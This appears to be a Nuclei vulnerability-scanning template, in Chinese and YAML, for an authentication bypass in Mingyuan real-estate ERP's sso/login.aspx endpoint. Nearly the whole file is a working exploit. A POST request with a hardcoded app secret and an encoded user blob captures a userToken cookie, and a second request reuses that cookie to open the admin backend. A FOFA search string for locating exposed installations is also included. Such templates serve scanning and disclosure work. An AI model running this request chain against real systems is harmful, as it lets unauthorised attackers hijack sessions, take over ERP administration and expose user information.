http:
    - extractors:
        - group: 1
          internal: true
          name: userToken
          part: header
          regex:
            - userToken=(.*?);
          type: regex
      raw:
        - |
          POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          __yzsAppSecret=testtest&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 组织架构
            - 首页管理
            - 系统设置
            - 日志管理
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /PubPlatform/nav/home/default?_nav=0000 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Cookie: {{userToken}}
id: mingyuandichanERP-login_aspx-Authentication-bypass
info:
    author: Superhero
    description: |-
        fofa: body="明源地产ERP" || body="用户登录-明源云ERP" || (body="明源云" && body="ERP") || body="/PubPlatform/Login/index.aspx"
        明源地产ERP sso/login.aspx 接口存在身份认证绕过漏洞，未授权的攻击者可利用漏洞url获取在线用户sessionid 导致用户信息泄露，并且切换网站session后可直接接管后台，造成信息泄露或恶意破坏，使系统处于极不安全状态。
    name: 明源地产ERP sso/login.aspx 身份认证绕过漏洞
    reference:
        - https://mp.weixin.qq.com/s/oycLYgqTBlenA0xuSAeDJg
    severity: high
    tags:
        - Authentication bypass
        - 明源云
        - 明源地产ERP
